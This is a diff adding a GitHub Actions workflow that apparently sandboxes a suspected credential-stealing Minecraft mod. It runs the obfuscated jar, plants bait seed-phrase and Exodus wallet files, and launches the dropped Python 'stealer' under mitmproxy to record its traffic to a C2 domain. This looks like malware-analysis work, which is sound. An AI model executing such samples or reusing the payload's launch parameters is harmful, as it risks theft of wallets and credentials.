@@ -1,0 +1,67 @@
+name: SNMITM
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+      - name: Bootstrap
+        shell: powershell
+        env:
+          UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
+        run: |
+          $d = "$env:RUNNER_TEMP\sn"; New-Item -ItemType Directory -Force "$d\mc" | Out-Null
+          $ctx = @{ userId = "$env:UID_"; tag = "abc"; domain = "thisisafalsepositive.st"; env = "Fabric"; gameDir = "$d\mc"; mcInfo = "{}" } | ConvertTo-Json -Compress
+          $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ctx))
+          Start-Process java -ArgumentList "-cp","agent\mod.jar","net.fabric.taxjHfh",$b64 -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" | Out-Null
+          Start-Sleep -Seconds 45
+          $py = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\NtProfileIndex" -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1
+          if ($py) { $py.FullName | Set-Content "$d\py.txt" } else { "NO PY" }
+      - name: Seed
+        shell: powershell
+        run: |
+          $desk = "$env:USERPROFILE\Desktop"
+          "seed phrase alpha" | Set-Content "$desk\seed phrase.txt"
+          "wallet" | Set-Content "$desk\wallet-backup.txt"
+          New-Item -ItemType Directory -Force "$env:APPDATA\Exodus\exodus.wallet" | Out-Null
+          "seco" | Set-Content "$env:APPDATA\Exodus\exodus.wallet\dummy.seco"
+      - name: MITM run
+        shell: powershell
+        env:
+          UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
+        run: |
+          $ErrorActionPreference = "Continue"
+          $d = "$env:RUNNER_TEMP\sn"
+          python -m pip install --quiet mitmproxy 2>&1 | Out-Null
+          $mp = "$env:APPDATA\mitmproxy"; New-Item -ItemType Directory -Force $mp | Out-Null
+          Start-Process mitmdump -ArgumentList "--mode","regular@8081","-w","$d\flows.bin","--set","stream_large_bodies=10m" -RedirectStandardOutput "$d\mitm.log" -RedirectStandardError "$d\mitm.err" -WindowStyle Hidden | Out-Null
+          Start-Sleep -Seconds 8
+          $env:HTTPS_PROXY = "http://127.0.0.1:8081"
+          $env:HTTP_PROXY  = "http://127.0.0.1:8081"
+          $env:REQUESTS_CA_BUNDLE = "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem"
+          $py = Get-Content "$d\py.txt"
+          $rt = Join-Path (Split-Path $py) "AppHost"
+          Push-Location (Split-Path $py)
+          $sp = Start-Process -FilePath ".\python.exe" -ArgumentList @((Join-Path $rt "main.py"), "-u", "$env:UID_", "--host", "thisisafalsepositive.st", "--env", "Fabric") -RedirectStandardOutput "$d\stealer.log" -RedirectStandardError "$d\stealer.err" -PassThru -Wait
+          "code=$($sp.ExitCode)"
+          Pop-Location
+          Get-Process mitmdump -ErrorAction SilentlyContinue | Stop-Process -Force
+          Start-Sleep -Seconds 2
+          Get-Content "$d\stealer.log" -Tail 20
+          Get-ChildItem "$d\flows.bin" | Select Length
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: sn-mitm
+          path: ${{ runner.temp }}/sn
+      - name: Kill
+        if: always()
+        shell: powershell
+        run: Get-Process java,python*,mitmdump -ErrorAction SilentlyContinue | Stop-Process -Force
